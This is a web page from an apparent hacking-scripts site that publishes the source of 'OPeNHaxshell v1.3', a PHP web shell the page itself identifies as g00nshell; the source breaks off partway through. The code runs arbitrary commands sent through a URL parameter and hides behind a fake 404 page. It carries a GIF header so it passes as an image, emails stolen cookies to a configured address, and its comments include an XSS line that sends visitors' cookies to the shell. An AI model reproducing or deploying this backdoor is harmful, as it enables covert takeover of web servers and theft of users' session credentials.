<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> OPeNHaxshell Script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>OPeNHaxshell Script</h2>
<p class="meta">09 Feb 2014</p>

<p>This OPeNHaxshell v1.3 script looks similar to the <a href="http://hackingscripts.com/c99-shell/" title="C99 shell">c99 shell</a>, and has been nicely commented (though not in detail in the body of the script).</p>

<p>UPDATE: This is actually just a g00nshell v1.3. How disappointing.</p>

<h3>OPeNHaxshell v1.3 final Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">GIF89;a</span>
<span class="x">666</span>
<span class="cp">&lt;?php</span>
<span class="cm">/*</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">#                       [OPeNHax]Tn presents:                         #</span>
<span class="cm">#                       OPeNHaxshell v1.3 final                         #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###DOCUMENTATION</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">####</span>
<span class="cm">#To execute commands, simply include ?cmd=___ in the url.            #</span>
<span class="cm">#Ex: http://site.com/shl.php?cmd=whoami                              #</span>
<span class="cm">#                                                                    #</span>
<span class="cm">#To steal cookies, use ?cookie=___ in the url.                       #</span>
<span class="cm">#Ex: &amp;lt;script&amp;gt;document.location.href=                                 #</span>
<span class="cm">#&#39;http://site.com/shl.php?cookie=&#39;+document.cookies&amp;lt;/script&amp;gt;         #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###VERIFICATION LEVELS</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">####</span>
<span class="cm">#0: No protection; anyone can access                                 #</span>
<span class="cm">#1: User-Agent required                                              #</span>
<span class="cm">#2: Require IP                                                       #</span>
<span class="cm">#3: Basic Authentication                                             #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###KNOWN BUGS</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">#Windows directory handling                                          #</span>
<span class="cm">#                                                                    #</span>
<span class="cm">#The SQL tool is NOT complete. There is currently no editing function#</span>
<span class="cm">#available. Some time in the future this may be fixed, but for now   #</span>
<span class="cm">#don&#39;t complain to me about it                                       #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###SHOUTS</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">#pr0be - Beta testing  &amp; CSS                                         #</span>
<span class="cm">#TrinTiTTY - Beta testing                                            #</span>
<span class="cm">#clorox - Beta testing                                               #</span>
<span class="cm">#Everyone else at g00ns.net                                          #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###NOTE TO ADMINISTRATORS</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">#If this script has been found on your server without your approval, #</span>
<span class="cm">#it would probably be wise to delete it and check your logs.         #</span>

<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">###</span>
<span class="cm">*/</span>
<span class="c1">// Configuration</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$uakey</span> <span class="o">=</span> <span class="s2">&quot;b5c3d0b28619de70bf5588505f4061f2&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded user-agent</span>
<span class="nv">$IP</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;127.0.0.2&quot;</span><span class="p">,</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">);</span> <span class="c1">// IP Addresses allowed to access shell</span>
<span class="nv">$email</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">// E-mail address where cookies will be sent</span>
<span class="nv">$user</span>  <span class="o">=</span> <span class="s2">&quot;af1035a85447f5aa9d21570d884b723a&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded User</span>
<span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;47e331d2b8d07465515c50cb0fad1e5a&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded Password</span>
<span class="c1">// Global Variables</span>
<span class="nv">$version</span> <span class="o">=</span> <span class="s2">&quot;1.3 final&quot;</span><span class="p">;</span>
<span class="nv">$self</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
<span class="nv">$soft</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">];</span>
<span class="nv">$servinf</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s2">&quot;[:]&quot;</span><span class="p">,</span> <span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">));</span>
<span class="nv">$servip</span> <span class="o">=</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nv">$servport</span> <span class="o">=</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="nv">$uname</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">();</span>
<span class="nv">$curuser</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
<span class="nv">$act</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">];</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
<span class="nv">$curdir</span> <span class="o">=</span> <span class="nx">cleandir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">());</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$dir</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$curdir</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$dir</span> <span class="o">!=</span> <span class="s2">&quot;nullz&quot;</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nx">cleandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);}</span>
<span class="nv">$contents</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
<span class="nv">$gf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;gf&#39;</span><span class="p">];</span>
<span class="nv">$img</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">];</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
<span class="k">switch</span><span class="p">(</span><span class="nv">$auth</span><span class="p">){</span> <span class="c1">// Authentication switcher</span>
  <span class="k">case</span> <span class="mi">0</span><span class="o">:</span> <span class="k">break</span><span class="p">;</span>
  <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$uakey</span><span class="p">){</span><span class="nx">hide</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
  <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">],</span><span class="nv">$IP</span><span class="p">)){</span><span class="nx">hide</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
  <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">]){</span><span class="nx">userauth</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
<span class="p">}</span>
    
<span class="k">function</span> <span class="nf">userauth</span><span class="p">(){</span> <span class="c1">// Basic authentication function</span>
  <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">;</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;WWW-Authenticate: Basic realm=&#39;Secure Area&#39;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$user</span> <span class="o">||</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_PW&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$pass</span><span class="p">)){</span>
    <span class="nx">hide</span><span class="p">();</span>
    <span class="k">die</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$act</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$cmd</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$cookie</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$f</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$gf</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$img</span><span class="p">){</span><span class="nx">main</span><span class="p">();}</span>
<span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nv">$act</span> <span class="o">&amp;&amp;</span> <span class="nv">$cmd</span><span class="p">){</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Results:&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;textarea rows=20 cols=100&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$line</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">){</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$email</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;Cookie Data&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$cookie</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;From: </span><span class="si">$email</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nx">hide</span><span class="p">();}</span> <span class="c1">// Cookie stealer function</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;view&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">&amp;&amp;</span> <span class="nv">$dir</span><span class="p">){</span><span class="nx">view</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span><span class="nx">img</span><span class="p">(</span><span class="nv">$img</span><span class="p">);}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$gf</span><span class="p">){</span><span class="nx">grab</span><span class="p">(</span><span class="nv">$gf</span><span class="p">);}</span>
<span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span><span class="nx">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);}</span>
<span class="k">else</span><span class="p">{</span>
  <span class="k">switch</span><span class="p">(</span><span class="nv">$act</span><span class="p">){</span>
    <span class="k">case</span> <span class="s2">&quot;phpinfo&quot;</span><span class="o">:</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;sql&quot;</span><span class="o">:</span> <span class="nx">sql</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;files&quot;</span><span class="o">:</span> <span class="nx">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;email&quot;</span><span class="o">:</span> <span class="nx">email</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;cmd&quot;</span><span class="o">:</span> <span class="nx">cmd</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;upload&quot;</span><span class="o">:</span> <span class="nx">upload</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;tools&quot;</span><span class="o">:</span> <span class="nx">tools</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;sqllogin&quot;</span><span class="o">:</span> <span class="nx">sqllogin</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;sql&quot;</span><span class="o">:</span> <span class="nx">sql</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;lookup&quot;</span><span class="o">:</span> <span class="nx">lookup</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;kill&quot;</span><span class="o">:</span> <span class="nx">kill</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="s2">&quot;phpexec&quot;</span><span class="o">:</span> <span class="nx">execphp</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
    <span class="k">default</span><span class="o">:</span> <span class="nx">main</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">cleandir</span><span class="p">(</span><span class="nv">$d</span><span class="p">){</span> <span class="c1">// Function to clean up the $dir and $curdir variables</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;//&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;////&quot;</span><span class="p">,</span> <span class="s2">&quot;//&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
  <span class="k">return</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">hide</span><span class="p">(){</span> <span class="c1">// Hiding function</span>
  <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$soft</span><span class="p">,</span> <span class="nv">$servip</span><span class="p">,</span> <span class="nv">$servport</span><span class="p">;</span>
<span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;!DOCTYPE HTML PUBLIC &#39;-//IETF//DTD HTML 2.0//EN&#39;&amp;gt;</span>
<span class="s2">&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;</span>
<span class="s2">&amp;lt;TITLE&amp;gt;404 Not Found&amp;lt;/TITLE&amp;gt;</span>
<span class="s2">&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;</span>
<span class="s2">&amp;lt;H1&amp;gt;Not Found&amp;lt;/H1&amp;gt;</span>
<span class="s2">The requested URL </span><span class="si">$self</span><span class="s2"> was not found on this server.&amp;lt;P&amp;gt;</span>
<span class="s2">&amp;lt;P&amp;gt;Additionally, a 404 Not Found</span>
<span class="s2">error was encountered while trying to use an ErrorDocument to handle the request.</span>
<span class="s2">&amp;lt;HR&amp;gt;</span>
<span class="s2">&amp;lt;ADDRESS&amp;gt;</span><span class="si">$soft</span><span class="s2"> Server at </span><span class="si">$servip</span><span class="s2"> Port </span><span class="si">$servport</span><span class="s2">&amp;lt;/ADDRESS&amp;gt;</span>
<span class="s2">&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">style</span><span class="p">(){</span> <span class="c1">// Style / header function</span>
  <span class="k">global</span> <span class="nv">$servip</span><span class="p">,</span><span class="nv">$version</span><span class="p">;</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;html&amp;gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  &amp;lt;head&amp;gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  &amp;lt;title&amp;gt;g00nshell v&quot;</span> <span class="o">.</span> <span class="nv">$version</span> <span class="o">.</span> <span class="s2">&quot; - &quot;</span> <span class="o">.</span> <span class="nv">$servip</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/title&amp;gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  &amp;lt;style&amp;gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  body { background-color:#000000; color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  h1 { color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  h3 { color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  input,textarea,select { color:#FFFFFF; background-color:#2F2F2F; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  textarea { font-family:Courier; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  a { color:#6F6F6F; text-decoration:none; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  a:hover { color:#7F7F7F; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  td,th { font-size:12px; vertical-align:middle; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  th { font-size:13px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  table { empty-cells:show;}</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  .inf { color:#7F7F7F; }</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  &amp;lt;/style&amp;gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="s2">  &amp;lt;/head&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">main</span><span class="p">(){</span> <span class="c1">// Main/menu function</span>
  <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$servip</span><span class="p">,</span> <span class="nv">$servport</span><span class="p">,</span> <span class="nv">$uname</span><span class="p">,</span> <span class="nv">$soft</span><span class="p">,</span> <span class="nv">$banner</span><span class="p">,</span> <span class="nv">$curuser</span><span class="p">,</span> <span class="nv">$version</span><span class="p">;</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$act</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Command Execute&#39;</span><span class="p">,</span><span class="s1">&#39;files&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;File View&#39;</span><span class="p">,</span><span class="s1">&#39;phpinfo&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;PHP info&#39;</span><span class="p">,</span> <span class="s1">&#39;phpexec&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;PHP Execute&#39;</span><span class="p">,</span>
  <span class="s1">&#39;tools&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Tools&#39;</span><span class="p">,</span><span class="s1">&#39;sqllogin&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;SQL&#39;</span><span class="p">,</span><span class="s1">&#39;email&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Email&#39;</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Get Files&#39;</span><span class="p">,</span><span class="s1">&#39;lookup&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;List Domains&#39;</span><span class="p">,</span><span class="s1">&#39;bshell&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Bindshell&#39;</span><span class="p">,</span><span class="s1">&#39;kill&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Kill Shell&#39;</span><span class="p">);</span>
  <span class="nv">$capt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;GET&#39; name=&#39;shell&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Host:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$servip</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Server software:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$soft</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
